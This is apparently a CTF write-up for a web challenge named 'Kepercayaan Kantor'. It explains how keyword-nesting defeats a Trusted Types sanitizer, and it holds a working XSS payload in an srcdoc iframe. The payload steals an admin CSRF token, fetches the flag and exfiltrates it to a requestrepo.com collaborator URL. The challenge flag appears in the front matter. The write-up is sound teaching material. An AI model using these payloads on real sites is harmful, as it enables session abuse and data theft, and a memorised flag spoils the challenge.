---
title: "Kepercayaan Kantor"
categories: "Web Exploitation"
tags: 
draft: false
points: 247
solves: 6
flags: ITFest26{5dJfnWh3BHwerHEWI223_4khlrNYA_dapaT_fdb4c6dccc80}
---

> Bang Durr baru saja selesai membaca artikel berjudul "Modern Web Security in 5 Minutes". Dengan penuh semangat, ia langsung mengubah sistem review internal perusahaan.
>
> Katanya sekarang semuanya sudah menggunakan teknologi keamanan paling modern. Bahkan setiap laporan yang dikirim pengguna akan diperiksa langsung oleh bot administrator.
>
> Author: Syalim

---

This is the company's internal note review system. Notes are written as the `rule` query parameter of `/view`. Two admin-only endpoints exist. `/admin/dashboard` prints the `CSRF` token, and `/admin/flag` returns the flag when called with a valid `CSRF` token. The bot sets an `admin_session` cookie from `ADMIN_TOKEN` before visiting. The cookie is `httpOnly`, so JavaScript cannot read it.

Every page that renders untrusted content carries this `CSP`:

```py
CSP = (
    "default-src 'self'; "
    "script-src 'self' 'unsafe-inline'; "
    "style-src 'self' 'unsafe-inline'; "
    "img-src 'self'; "
    "connect-src 'self'; "
    "frame-src 'none'; "
    "base-uri 'none'; "
    "require-trusted-types-for 'script'; "
    "trusted-types notePolicy;"
)
```

The `/view` page renders the note by assigning `innerHTML` through a Trusted Types policy named `notePolicy`. With `require-trusted-types-for 'script'`, every HTML sink in the page must go through a policy, so the user's `rule` only reaches the DOM through this sanitizer:

```js
function decodeEntities(str) {
    return str
        .replace(/&lt;/gi, '<')
        .replace(/&gt;/gi, '>')
        .replace(/&quot;/gi, '"')
        .replace(/&#x?[0-9a-f]+;?/gi, (m) => {
            const hex = /x/i.test(m);
            const n = parseInt(m.replace(/[&#x;]/gi, ''), hex ? 16 : 10);
            return isNaN(n) ? m : String.fromCodePoint(n);
        })
        .replace(/&amp;/gi, '&');
}

if (window.trustedTypes && trustedTypes.createPolicy) {
    policy = trustedTypes.createPolicy('notePolicy', {
        createHTML: (input) => {
            let safe = decodeEntities(input);
            safe = safe.replace(/<\s*script/gi, '');
            safe = safe.replace(/<\s*\/\s*script\s*>/gi, '');
            safe = safe.replace(/iframe/gi, '');
            safe = safe.replace(/srcdoc/gi, '');
            safe = safe.replace(/javascript:/gi, '');
            safe = safe.replace(/on\w+\s*=/gi, '');
            return safe;
        }
    });
}
```

The policy first decodes HTML entities, then strips `<script` (allowing whitespace after the bracket), the closing `</script>` tag, the words `iframe` and `srcdoc`, `javascript:` URLs, and `on*=` event handlers.

On the admin side the CSRF token is a constant, computed once at startup from `ADMIN_TOKEN`:

```py
CSRF = hashlib.md5(("csrf|" + ADMIN_TOKEN).encode()).hexdigest()
```

It never changes, and the dashboard prints it to admin users. The two admin endpoints:

```py
@app.route('/admin/dashboard')
def admin_dashboard():
    if not is_admin(request):
        return Response("Forbidden", status=403)
    resp = make_response(render_template('dashboard.html', csrf=CSRF))
    resp.headers['Content-Security-Policy'] = CSP
    return resp
```

```py
@app.route('/admin/flag', methods=['POST'])
def admin_flag():
    if not is_admin(request):
        return Response("Forbidden", status=403)
    if request.form.get('csrf') != CSRF:
        return Response("Bad CSRF token", status=403)
    return Response(FLAG, mimetype='text/plain')
```

The escaping comes from the fact that the stripping runs on already-decoded text, and each replacement can reassemble the very keyword it removes. Writing a keyword around itself, `ifr` + `iframe` + `ame`, makes the middle copy match the pattern, and once it is removed the two halves join back into `iframe`.

Scripts inserted through `innerHTML` never execute, but an `srcdoc` iframe parses its attribute as a brand new document, so the inline script runs. The `srcdoc` document inherits the page `CSP`, and `'unsafe-inline'` allows the script. `frame-src 'none'` does not stop an `srcdoc` frame either, since no URL is loaded (<https://hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/iframes-in-xss-and-csp.html>).

Inside the frame the script fetches `/admin/dashboard` extracts the 32-hex token with a regex, POSTs it as the `csrf` form field to `/admin/flag`. A direct fetch to the outside would trip `connect-src 'self'`, so the exfiltration instead navigates the top window to the collaborator URL, which no directive restricts.

```py
import requests

payload1 = 'fetch("/admin/dashboard").then(r=>r.text()).then(h=>{const c=h.match(/csrf=([0-9a-f]{32})/)[1];fetch("/admin/flag",{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:"csrf="+c}).then(r=>r.text()).then(f=>top.location="http://tc77xf44.requestrepo.com/?f="+encodeURIComponent(f))})'
payload2 = "<ifriframeame srcsrcdocdoc='<scr<scriptipt>" + payload1 + "</scr</script>ipt>'></ifriframeame>"

r = requests.post("http://chall.itfestmicroipb.web.id:31357/api/report", json={"rule": payload2}, headers={"Content-Type": "application/json"})
print(r.text)
```
